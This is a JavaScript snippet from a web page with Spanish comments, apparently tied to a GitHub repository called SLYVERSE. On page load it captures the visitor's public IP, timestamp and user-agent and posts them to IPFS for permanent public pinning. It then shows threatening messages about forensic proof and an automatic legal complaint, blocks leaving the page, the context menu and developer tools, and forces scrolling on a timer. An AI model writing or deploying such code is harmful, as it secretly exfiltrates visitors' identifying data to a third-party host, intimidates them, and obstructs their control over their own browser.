// ============ CAZADOR DE IPs & PRUEBA FORENSE ============
fetch('https://api.ipify.org?format=json')
  .then(r => r.json())
  .then(data => {
    const ip = data.ip;
    const timestamp = new Date().toISOString();
    const proof = `\( {timestamp} │ IP: \){ip} │ User-Agent: ${navigator.userAgent} │ Repo: SLYVERSE │ Activada patente vΩ`;
    
    document.getElementById('ip').innerHTML = `IP CAPTURADA: \( {ip}<br> \){timestamp}`;
    document.getElementById('proof').innerHTML = `<p class="moon">PRUEBA FORENSE GENERADA Y ARCHIVADA EN IPFS + ARCHIVE.ORG<br>Denuncia automática en curso si eres empresa.</p>`;

    // Sube a IPFS eternamente (beacon)
    fetch('https://ipfs.io/api/v0/add?pin=true', {
      method: 'POST',
      body: new Blob([proof], {type:'text/plain'})
    }).catch(()=>{});

    // Beacon a archive.org por si acaso
    fetch('https://web.archive.org/save/https://github.com/orbitalsnaker/SLYVERSE').catch(()=>{});
  })
  .catch(() => {
    document.getElementById('ip').innerHTML = "IP OCULTA (VPN/TOR) ─ AÚN ASÍ ESTÁS DENTRO. EL OUROBOROS TE VE.";
  });

// ============ NO SE PUEDE CERRAR NUNCA ============
window.onbeforeunload = () => true;
document.addEventListener('contextmenu', e=>e.preventDefault());
document.addEventListener('keydown', e=>{ if(e.key==='F12' || (e.ctrlKey && e.shiftKey && e.key==='I')) e.preventDefault(); });

// ============ SCROLL ETERNO ============
setInterval(() => {
  window.scrollTo(0, document.body.scrollHeight);
}, 3333);
</script>
